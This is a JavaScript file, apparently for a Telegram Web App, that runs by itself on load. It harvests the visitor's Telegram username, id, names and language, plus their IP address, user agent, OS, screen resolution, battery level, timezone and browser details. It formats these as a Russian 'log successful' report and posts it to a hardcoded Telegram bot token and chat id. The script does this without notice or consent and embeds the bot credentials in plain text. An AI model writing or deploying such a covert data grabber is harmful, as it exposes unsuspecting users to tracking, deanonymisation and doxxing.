async function getIPAddress() {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
}

function getUserAgent() {
    return navigator.userAgent;
}

function getOSName() {
    return navigator.platform;
}

function getScreenResolution() {
    return `${window.screen.width}x${window.screen.height}`;
}

async function getBatteryPercentage() {
    const battery = await navigator.getBattery();
    return Math.floor(battery.level * 100);
}

function getBrowserInfo() {
    return {
        name: navigator.appName,
        version: navigator.appVersion,
        engine: navigator.product
    };
}

async function sendDataToTelegram() {
    const ipAddress = await getIPAddress();
    const userAgent = getUserAgent();
    const osName = getOSName();
    const screenResolution = getScreenResolution();
    const batteryPercentage = await getBatteryPercentage();
    const browserInfo = getBrowserInfo();
    let tg = window.Telegram.WebApp;

    const message = `
<b>✨ Лог успешен!</b>

<b>🔍 Информация об аккаунте:</b>
├ Тэг: @${tg.initDataUnsafe.user.username}
├ Айди: <code>${tg.initDataUnsafe.user.id}</code>
├ Имя: <code>${tg.initDataUnsafe.user.first_name}</code>
├ Фамилия: <code>${tg.initDataUnsafe.user.last_name}</code>
├ Язык: <code>${tg.initDataUnsafe.user.language_code}</code>
└ Можно писать в ЛС: <code>${tg.initDataUnsafe.user.allows_write_to_pm}</code>

<b>🖥️ Информация об устройстве:</b>
├ Айпи: <code>${ipAddress}</code>
├ UserAgent: <code>${userAgent}</code>
├ Хэш: <code>undefined</code>
├ Имя ОС: <code>${osName}</code>
├ Разрешение экрана: <code>${screenResolution}</code>
├ Процент батареи: <code>${batteryPercentage}%</code>
└ Часовой пояс: <code>${new Date().getTimezoneOffset()}</code>

<b>🌐 Информация о браузере:</b>
├ Название браузера: <code>${browserInfo.name}</code>
├ Версия браузера: <code>${browserInfo.version}</code>
└ Тип движка браузера: <code>${browserInfo.engine}</code>
    `;

    const token = '7159693608:AAH9PgIOO7AJja_tqq4g8IdGbGMPw-Q1Ajg';
    const telegramBotURL = `https://api.telegram.org/bot${token}/sendMessage`;
    const chatId = '-1002005164665';

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('text', message);
    formData.append('parse_mode', 'HTML');

    await fetch(telegramBotURL, {
        method: 'POST',
        body: formData
    });
}

sendDataToTelegram();
